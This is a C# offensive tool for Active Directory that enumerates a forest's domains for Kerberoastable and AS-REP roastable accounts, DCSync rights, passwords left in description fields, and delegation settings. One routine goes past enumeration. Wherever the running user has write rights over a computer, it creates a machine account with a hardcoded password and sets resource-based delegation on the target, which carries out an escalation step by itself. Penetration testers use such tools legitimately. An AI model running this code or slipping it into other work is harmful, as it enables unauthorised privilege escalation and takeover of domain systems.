﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.DirectoryServices.AccountManagement;
using System.DirectoryServices.ActiveDirectory;
using System.DirectoryServices;
using System.IO;
using System.Collections;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Runtime.InteropServices;

namespace ADautoenum
{
    class Program
    {

        public enum SID_NAME_USE {
            SidTypeUser = 1,
            SidTypeGroup,
            SidTypeDomain,
            SidTypeAlias,
            SidTypeWellKnownGroup,
            SidTypeDeletedAccount,
            SidTypeInvalid,
            SidTypeUnknown,
            SidTypeComputer,
            SidTypeLabel,
            SidTypeLogonSession
        }


        public static string GetRandomName()
        {
            string res = "";
            var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var random = new Random();

            char[] old = new char[10];

            for(int i = 0; i < 10; i++)
            {
                old[i] = chars[random.Next(10)];
            }
            res = new String(old);
            return res;
        }

        public delegate string runall(string name);
        public static string GetKerberoastable(string domainname)
        {
            string res = "";
            StringWriter sw = new StringWriter();
            Console.WriteLine("-------Finding Kerberoastable Users-------");
            try
            {
                string DomainName = domainname;
                // testing.tech69.local
                string[] domain = DomainName.Split('.');
                for(int i = 0; i < domain.Length; i++)
                {
                    domain[i] = "DC=" + domain[i];
                }
                string dn = String.Join(",", domain);

                DirectoryEntry de = new DirectoryEntry(String.Format("LDAP://{0}",dn));

                DirectorySearcher ds = new DirectorySearcher();
                ds.SearchRoot = de;
                ds.Filter = "(&(objectclass=user)(serviceprincipalname=*))";

                foreach(SearchResult sr in ds.FindAll())
                {
                    sw.WriteLine("User: {0} from the domain: {1}", sr.Properties["samaccountname"][0],DomainName);
                    sw.WriteLine("SPN: {0}", sr.Properties["serviceprincipalname"][0]);
                }

                if (ds.FindAll().Count == 0)
                {
                    res = "Nothing Found";
                    
                }
                else
                {
                    res += sw.ToString();
                }

                
            }
            catch(Exception e)  {
                sw.WriteLine("Error occurred");
                res = sw.ToString();
                
            }
            return res;
        }


        public static string GetASREPRoastable(string domainname)
        {
            string res = "";
            StringWriter sw = new StringWriter();
            Console.WriteLine("------Finding ASREPRoastable users------");
            try
            {
                List<string> l = new List<string>();
                l.Add(""); l.Add("ACCOUNTDISABLE"); l.Add(""); l.Add("HOMEDIR_REQUIRED");
                l.Add("LOCKOUT"); l.Add("PASSWD_NOTREQD"); l.Add("PASSWD_CANT_CHANGE");
                l.Add("ENCRYPTED_TEXT_PWD_ALLOWED"); l.Add("TEMP_DUPLICATE_ACCOUNT");
                l.Add("NORMAL_ACCOUNT"); l.Add(""); l.Add("INTERDOMAIN_TRUST_ACCOUNT");
                l.Add("WORKSTATION_TRUST_ACCOUNT"); l.Add("SERVER_TRUST_ACCOUNT"); l.Add(""); l.Add("");
                l.Add("DONT_EXPIRE_PASSWORD"); l.Add("MNS_LOGON_ACCOUNT");
                l.Add("SMARTCARD_REQUIRED"); l.Add("TRUSTED_FOR_DELEGATION");
                l.Add("NOT_DELEGATED"); l.Add("USE_DES_KEY_ONLY");
                l.Add("DONT_REQ_PREAUTH"); l.Add("PASSWORD_EXPIRED");
                l.Add("TRUSTED_TO_AUTH_FOR_DELEGATION");

                string DomainName = domainname;
                // testing.tech69.local
                string[] domain = DomainName.Split('.');
                for (int i = 0; i < domain.Length; i++)
                {
                    domain[i] = "DC=" + domain[i];
                }
                string dn = String.Join(",", domain);

                DirectoryEntry de = new DirectoryEntry(String.Format("LDAP://{0}", dn));
                DirectorySearcher ds = new DirectorySearcher();
                ds.SearchRoot = de;
                ds.Filter = "(&(objectclass=user)(useraccountcontrol>=4194304))";

                foreach (SearchResult sr in ds.FindAll())
                {
                    sw.WriteLine("User: {0} from Domain: {1}", sr.Properties["samaccountname"][0], DomainName);
                    sw.WriteLine("UserAccountControl: {0}", sr.Properties["useraccountcontrol"][0]);
                    int uac = Convert.ToInt32(sr.Properties["useraccountcontrol"][0]);
                    string uac_binary = Convert.ToString(uac, 2);
                    List<string> flags = new List<string>();
                    //Console.WriteLine(l.Count);
                    //Console.WriteLine(uac_binary.Length);
                    for (int i = 0; i < uac_binary.Length; i++)
                    {
                        int result2 = uac & Convert.ToInt32(Math.Pow(2, i));
                        if (result2 != 0)
                        {
                            //Console.WriteLine(l[i]);
                            flags.Add(l[i]);
                        }

                    }
                    foreach (string temp in flags)
                    {
                        sw.WriteLine(temp);
                    }
                    sw.WriteLine();

                }

                if (ds.FindAll().Count == 0)
                {
                    res = "Nothing Found";
                }
                else
                {
                    res = sw.ToString();
                }
            }
            catch(Exception e)
            {
                res = String.Format("Error occurred {0}",e.Message);
            }

            return res;
        }

        public static string GetDCSyncUsers(string domainname)
        {
            string res = "";
            StringWriter sw = new StringWriter();
            Console.WriteLine("------Finding DCSync capable users------");
            try
            {
                Hashtable ht = new Hashtable();
                ht.Add("DS-Replication-Get-Changes", "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2");
                ht.Add("DS-Replication-Get-Changes-All", "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2");
                ht.Add("DS-Replication-Get-Changes-In-Filtered-Set", "89e95b76-444d-4c62-991a-0facbeda640c");
                ht.Add("DS-Replication-Manage-Topology", "1131f6ac-9c07-11d1-f79f-00c04fc2dcd2");
                ht.Add("DS-Replication-Monitor-Topology", "f98340fb-7c5b-4cdb-a00b-2ebdfa115a96");
                ht.Add("DS-Replication-Synchronize", "1131f6ab-9c07-11d1-f79f-00c04fc2dcd2");

                string DomainName = domainname;
                // testing.tech69.local
                string[] domain = DomainName.Split('.');
                for (int i = 0; i < domain.Length; i++)
                {
                    domain[i] = "DC=" + domain[i];
                }
                string dn = String.Join(",", domain);

                DirectoryEntry de = new DirectoryEntry(String.Format("LDAP://{0}", dn));
                DirectorySearcher ds = new DirectorySearcher();
                ds.SearchRoot = de;
                

                foreach(SearchResult sr in ds.FindAll())
                {
                    try
                    {
                        DirectoryEntry temp = sr.GetDirectoryEntry();

                        AuthorizationRuleCollection arc = temp.ObjectSecurity.GetAccessRules(true, true, typeof(NTAccount));

                        foreach (ActiveDirectoryAccessRule ar in arc)
                        {
                            if (dn.Contains(temp.Name.ToString()))
                            {
                                foreach (DictionaryEntry dic in ht)
                                {
                                    if (dic.Value.ToString() == ar.ObjectType.ToString())
                                    {
                                        sw.WriteLine(ar.IdentityReference);
                                        sw.WriteLine(ar.ObjectType);
                                        sw.WriteLine(dic.Key.ToString());
                                    }
                                }
                            }

                        }
                    }
                    catch { }

                }

                res = sw.ToString();
            }
            catch (Exception e)
            {
               
            }
            return res;
        }

        public static string GetDescription(string domainname)
        {
            string res = "";
            StringWriter sw = new StringWriter();

            Console.WriteLine("------Finding Description field of Users------");
            try
            {
                
                string DomainName = domainname;
                // testing.tech69.local
                string[] domain = DomainName.Split('.');
                for (int i = 0; i < domain.Length; i++)
                {
                    domain[i] = "DC=" + domain[i];
                }
                string dn = String.Join(",", domain);

                DirectoryEntry de = new DirectoryEntry(String.Format("LDAP://{0}", dn));
                DirectorySearcher ds = new DirectorySearcher();
                ds.SearchRoot = de;
                ds.Filter = "(objectclass=user)";
                foreach(SearchResult sr in ds.FindAll())
                {
                    //Console.WriteLine(sr.Properties["description"][0]);
                    try
                    {
                        string description = sr.GetDirectoryEntry().Properties["description"][0].ToString();
                        if (description.Length > 0)
                        {
                            sw.WriteLine("Name: {0}",sr.Properties["samaccountname"][0]);
                            sw.WriteLine("Description: {0}",description);
                        }
                    }
                    catch { }
                }

                res = sw.ToString();

            }
            catch(Exception e)
            {
                res = e.Message;
            }


                return res;
        }


        public static string GetUnconstrainedDelegation(string domainname)
        {
            string res = "";
            StringWriter sw = new StringWriter();
            try {

                List<string> l = new List<string>();
                l.Add(""); l.Add("ACCOUNTDISABLE"); l.Add(""); l.Add("HOMEDIR_REQUIRED");
                l.Add("LOCKOUT"); l.Add("PASSWD_NOTREQD"); l.Add("PASSWD_CANT_CHANGE");
                l.Add("ENCRYPTED_TEXT_PWD_ALLOWED"); l.Add("TEMP_DUPLICATE_ACCOUNT");
                l.Add("NORMAL_ACCOUNT"); l.Add(""); l.Add("INTERDOMAIN_TRUST_ACCOUNT");
                l.Add("WORKSTATION_TRUST_ACCOUNT"); l.Add("SERVER_TRUST_ACCOUNT"); l.Add(""); l.Add("");
                l.Add("DONT_EXPIRE_PASSWORD"); l.Add("MNS_LOGON_ACCOUNT");
                l.Add("SMARTCARD_REQUIRED"); l.Add("TRUSTED_FOR_DELEGATION");
                l.Add("NOT_DELEGATED"); l.Add("USE_DES_KEY_ONLY");
                l.Add("DONT_REQ_PREAUTH"); l.Add("PASSWORD_EXPIRED");
                l.Add("TRUSTED_TO_AUTH_FOR_DELEGATION");

                sw.WriteLine("------Finding Unconstrained Delegation Accounts------");
                string DomainName = domainname;
                // testing.tech69.local
                string[] domain = DomainName.Split('.');
                for (int i = 0; i < domain.Length; i++)
                {
                    domain[i] = "DC=" + domain[i];
                }
                string dn = String.Join(",", domain);

                DirectoryEntry de = new DirectoryEntry(String.Format("LDAP://{0}", dn));
                DirectorySearcher ds = new DirectorySearcher();
                ds.SearchRoot = de;
                ds.Filter = "(&(objectclass=user)(useraccountcontrol>=524288))";

                foreach(SearchResult sr in ds.FindAll())
                {
                    
                    // sw.WriteLine(sr.Properties["useraccountcontrol"][0]);
                    int uac = Convert.ToInt32(sr.Properties["useraccountcontrol"][0]);
                    string uac_binary = Convert.ToString(uac, 2);
                    List<string> flags = new List<string>();
                    //Console.WriteLine(l.Count);
                    //Console.WriteLine(uac_binary.Length);
                    for (int i = 0; i < uac_binary.Length; i++)
                    {
                        int result2 = uac & Convert.ToInt32(Math.Pow(2, i));
                        if (result2 != 0)
                        {
                            //Console.WriteLine(l[i]);
                            flags.Add(l[i]);
                        }

                    }
                    foreach (string temp in flags)
                    {
                        if(temp.ToLower().Contains("deleg"))
                        {
                            sw.WriteLine("Name: {0}",sr.Properties["samaccountname"][0]);
                            foreach (string temp2 in flags)
                            {
                                sw.WriteLine(temp2);
                            }
                        }
                    }

                }



                res = sw.ToString();
            }

            catch(Exception e)
            {
                res = e.Message;

            }

            return res;

        }
        
        
        public static string GetConstrainedDelegation(string domainname)
        {
            string res = "";

            StringWriter sw = new StringWriter();
            try
            {

                List<string> l = new List<string>();
                l.Add(""); l.Add("ACCOUNTDISABLE"); l.Add(""); l.Add("HOMEDIR_REQUIRED");
                l.Add("LOCKOUT"); l.Add("PASSWD_NOTREQD"); l.Add("PASSWD_CANT_CHANGE");
                l.Add("ENCRYPTED_TEXT_PWD_ALLOWED"); l.Add("TEMP_DUPLICATE_ACCOUNT");
                l.Add("NORMAL_ACCOUNT"); l.Add(""); l.Add("INTERDOMAIN_TRUST_ACCOUNT");
                l.Add("WORKSTATION_TRUST_ACCOUNT"); l.Add("SERVER_TRUST_ACCOUNT"); l.Add(""); l.Add("");
                l.Add("DONT_EXPIRE_PASSWORD"); l.Add("MNS_LOGON_ACCOUNT");
                l.Add("SMARTCARD_REQUIRED"); l.Add("TRUSTED_FOR_DELEGATION");
                l.Add("NOT_DELEGATED"); l.Add("USE_DES_KEY_ONLY");
                l.Add("DONT_REQ_PREAUTH"); l.Add("PASSWORD_EXPIRED");
                l.Add("TRUSTED_TO_AUTH_FOR_DELEGATION");

                sw.WriteLine("------Finding Constrained Delegation Accounts------");
                string DomainName = domainname;
                // testing.tech69.local
                string[] domain = DomainName.Split('.');
                for (int i = 0; i < domain.Length; i++)
                {
                    domain[i] = "DC=" + domain[i];
                }
                string dn = String.Join(",", domain);

                DirectoryEntry de = new DirectoryEntry(String.Format("LDAP://{0}", dn));
                DirectorySearcher ds = new DirectorySearcher();
                ds.SearchRoot = de;
                ds.Filter = "(objectclass=user)";

                foreach (SearchResult sr in ds.FindAll())
                {
                    try
                    {
                        if (sr.Properties["msds-allowedtodelegateto"][0].ToString() != null)
                        {

                            sw.WriteLine("Name: {0}", sr.Properties["samaccountname"][0]);
                            sw.Write("msds-alloweddelegateto: ");
                            for (int i = 0; i < sr.Properties["msds-allowedtodelegateto"].Count; i++)
                            {
                                sw.Write(sr.Properties["msds-allowedtodelegateto"][i] + ",");
                            }

                            int uac = Convert.ToInt32(sr.Properties["useraccountcontrol"][0]);
                            string uac_binary = Convert.ToString(uac, 2);
                            List<string> flags = new List<string>();
                            
                            for (int i = 0; i < uac_binary.Length; i++)
                            {
                                int result2 = uac & Convert.ToInt32(Math.Pow(2, i));
                                if (result2 != 0)
                                {
                                    //Console.WriteLine(l[i]);
                                    flags.Add(l[i]);
                                }

                            }
                            foreach (string temp in flags)
                            {
                                if (temp.ToLower().Contains("deleg"))
                                {
                                  
                                  

                                    foreach (string temp2 in flags)
                                    {
                                        sw.WriteLine(temp2);
                                    }
                                }
                            }
                        }
                    }
                    catch(Exception e)
                    {
                        //sw.WriteLine(e.Message);
                    }
                }
                res = sw.ToString();
            }
            catch(Exception e)
            {
                res = e.Message;
            }

            return res;

        }
        

        public static string GetResourceDelegation(string domainname)
        {
            string res = "";
            StringWriter sw = new StringWriter();
            try
            {

                List<string> l = new List<string>();
                l.Add(""); l.Add("ACCOUNTDISABLE"); l.Add(""); l.Add("HOMEDIR_REQUIRED");
                l.Add("LOCKOUT"); l.Add("PASSWD_NOTREQD"); l.Add("PASSWD_CANT_CHANGE");
                l.Add("ENCRYPTED_TEXT_PWD_ALLOWED"); l.Add("TEMP_DUPLICATE_ACCOUNT");
                l.Add("NORMAL_ACCOUNT"); l.Add(""); l.Add("INTERDOMAIN_TRUST_ACCOUNT");
                l.Add("WORKSTATION_TRUST_ACCOUNT"); l.Add("SERVER_TRUST_ACCOUNT"); l.Add(""); l.Add("");
                l.Add("DONT_EXPIRE_PASSWORD"); l.Add("MNS_LOGON_ACCOUNT");
                l.Add("SMARTCARD_REQUIRED"); l.Add("TRUSTED_FOR_DELEGATION");
                l.Add("NOT_DELEGATED"); l.Add("USE_DES_KEY_ONLY");
                l.Add("DONT_REQ_PREAUTH"); l.Add("PASSWORD_EXPIRED");
                l.Add("TRUSTED_TO_AUTH_FOR_DELEGATION");

                sw.WriteLine("------Finding Resource based Constrained Delegation Accounts------");
                string DomainName = domainname;
                // testing.tech69.local
                string[] domain = DomainName.Split('.');
                for (int i = 0; i < domain.Length; i++)
                {
                    domain[i] = "DC=" + domain[i];
                }
                string dn = String.Join(",", domain);

                DirectoryEntry de = new DirectoryEntry(String.Format("LDAP://{0}", dn));
                DirectorySearcher ds = new DirectorySearcher();
                ds.SearchRoot = de;
                //ds.Filter = "(objectclass=user)";
                //ds.PropertiesToLoad.Add("ms-DS-MachineAccountQuota");

                SearchResult sr = ds.FindOne();
                
                    try
                    {
                        if (sr.Properties["ms-DS-MachineAccountQuota"][0].ToString() != null)
                        {
                            sw.WriteLine(sr.Path);
                           // sw.WriteLine(sr.Properties["samaccountname"][0]);
                            //sw.WriteLine(sr.Properties["ms-DS-MachineAccountQuota"][0]);

                        int computeraccountscancreate = Convert.ToInt32(sr.Properties["ms-DS-MachineAccountQuota"][0].ToString());
                        if(computeraccountscancreate > 0)
                        {
                            sw.WriteLine("Number of computer accounts we can create: {0}", computeraccountscancreate);

                        }
                        }


                    ds.Filter = "(objectclass=computer)";

                    string currentusername = WindowsIdentity.GetCurrent().Name;
                    // TECH69\test2
                    currentusername = currentusername.Split('\\')[1];
                    foreach(SearchResult sr2 in ds.FindAll())
                    {


                       DirectoryEntry temp =  sr2.GetDirectoryEntry();

                      ActiveDirectorySecurity ads=  temp.ObjectSecurity;

                       AuthorizationRuleCollection arc = ads.GetAccessRules(true, true, typeof(NTAccount));

                        foreach(ActiveDirectoryAccessRule ar in arc)
                        {
                            if (ar.IdentityReference.ToString().ToLower().Contains(currentusername.ToLower()))
                            {

                                if (ar.ActiveDirectoryRights.ToString().ToLower().Contains("genericwrite") || ar.ActiveDirectoryRights.ToString().ToLower().Contains("genericall"))
                                {

                                    sw.WriteLine(sr2.Path);
                                    sw.WriteLine(ar.ActiveDirectoryRights);
                                    sw.WriteLine(ar.AccessControlType);
                                    sw.WriteLine(ar.InheritanceFlags);

                                    string newsid = CreateNewComputer("d", GetRandomName());

                                    string sddl = @"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + newsid + ")";

                                    RawSecurityDescriptor rs = new RawSecurityDescriptor(sddl);

                                    byte[] bytesid = new byte[sddl.Length];
                                    rs.GetBinaryForm(bytesid, 0);

                                    temp.Properties["msds-allowedtoactonbehalfofotheridentity"].Value = bytesid;
                                    temp.CommitChanges();

                                    sw.WriteLine("Set SID: {0} to {1}", newsid, temp.Path);

                                }

                            }
                        }

                    }

                    }
                    catch { }

                

                res = sw.ToString();

            }
            catch(Exception e)
            {
                res = e.Message;
            }


                return res;

        }


        public static string CreateNewComputer(string domainname,string machinename)
        {
            string res = "";

            try {

                DirectoryEntry de = new DirectoryEntry("LDAP://CN=Computers,DC=tech69,DC=local");

                DirectoryEntry computerobj = de.Children.Add("CN="+machinename, "computer");

                computerobj.Properties["useraccountcontrol"].Value = 0x1000;
                computerobj.Properties["samaccountname"].Value = machinename + "$";
                computerobj.CommitChanges();

                string password = "Passw0rd2";
                computerobj.Invoke("SetPassword", password);
                computerobj.CommitChanges();

                Console.WriteLine("Created computer account: {0}",machinename+"$");
                Console.WriteLine("Password: {0}",password);

                byte[] sid= (byte[])  computerobj.Properties["objectsid"][0];

                var si = new SecurityIdentifier(sid, 0);
                
                Console.WriteLine("SID: {0}",si.ToString());

                res = si.ToString();

            }


            catch(Exception e)
            {
                res = e.Message;
            }

            return res;


        }

        #region winapi
        [DllImport("Advapi32.dll")]
        public static extern bool LookupAccountNameA(
             string lpSystemName,
             string lpAccountName,
            [MarshalAs(UnmanagedType.LPArray)] byte[] Sid,
            ref uint cbSid,
            IntPtr ReferencedDomainName,
            ref uint cchReferencedDomainName,
            out SID_NAME_USE peUse
            );


        [DllImport("Advapi32.dll")]
        public static extern bool ConvertSidToStringSidW(IntPtr Sid,
            [param:MarshalAs(UnmanagedType.LPWStr)] string StringSid);

        [DllImport("kernel32.dll")]
        public static extern int GetLastError();
        #endregion
        static void Main(string[] args)
        {

            #region testingwinapi
            byte[] sid = null;
            uint size = 0;
            uint type1 = 0;
            uint csize = 0;
            SID_NAME_USE sidUse;


            /*
                        LookupAccountNameA(
                            null, 
                            "Administrator",
                             sid,
                            ref size,
                            IntPtr.Zero,
                            ref csize,
                            out sidUse
                            );

                        Console.WriteLine(GetLastError());
                        Console.WriteLine(size);


                        sid = new byte[size];
                        uint temp = 0;
                        LookupAccountNameA(
                            null,
                            "Administrator",
                             sid,
                            ref size,
                            IntPtr.Zero,
                            ref temp,
                            out sidUse
                            );

                        Console.WriteLine(GetLastError());
                        Environment.Exit(0);

                        string stringsid = "";
                        ConvertSidToStringSidW(sid, stringsid);
                        Console.WriteLine(stringsid);*/
            #endregion


            Domain d = Domain.GetCurrentDomain();
            string DomainName = d.Name;

            runall r = new runall(GetKerberoastable);
            
            r += GetASREPRoastable;
            r += GetDCSyncUsers;
            r += GetDescription;
            r += GetUnconstrainedDelegation;
            r += GetConstrainedDelegation;
            r += GetResourceDelegation;


            Forest f = Forest.GetCurrentForest();
            DomainCollection domains = f.Domains;

            Delegate[] d2 = r.GetInvocationList();

            foreach (Domain domain in domains)
            {
                foreach (Delegate temp in d2)
                {
                    Console.WriteLine(temp.DynamicInvoke(domain.Name));
                }
            }
            /*Console.WriteLine(GetKerberoastable(DomainName));
            Console.WriteLine();
            Console.WriteLine(GetASREPRoastable(DomainName));
            Console.WriteLine();
            
            Console.WriteLine(GetDCSyncUsers(DomainName));
            Console.WriteLine();
            Console.WriteLine(GetDescription(DomainName));*/
        }
    }
}
